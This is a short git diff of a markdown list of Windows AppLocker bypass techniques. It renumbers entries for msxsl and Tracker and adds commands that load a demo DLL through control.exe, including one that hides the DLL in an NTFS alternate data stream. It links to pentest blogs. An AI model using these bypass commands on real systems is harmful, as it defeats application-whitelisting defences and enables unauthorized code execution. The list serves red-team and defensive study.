@@ -236,7 +236,7 @@ Link:  https://github.com/milkdevil/UltimateAppLockerByPassList
 
 
 
-## msxsl
+## 9.msxsl
 
 Code
 
@@ -280,7 +280,7 @@ Link:  https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
 https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html
 
 
-## Tracker 
+## 10.Tracker 
 
 ``` stylus
 Tracker.exe /d runcalc.dll /c cmd
@@ -289,6 +289,12 @@ Tracker.exe /d runcalc.dll /c cmd
 link https://twitter.com/Sudhanshu_C/status/943011972261412864
 https://twitter.com/subTee/status/793151392185589760
 
+## 11.control  .\example\runcalc.dll
+
+
+## 12.type .\example\runcalc.dll >  .\example\demon:secist.dll | control   .\example\demon:secist.dll
+LINK: https://twitter.com/bohops/status/954466315913310209
+https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
 
 
 
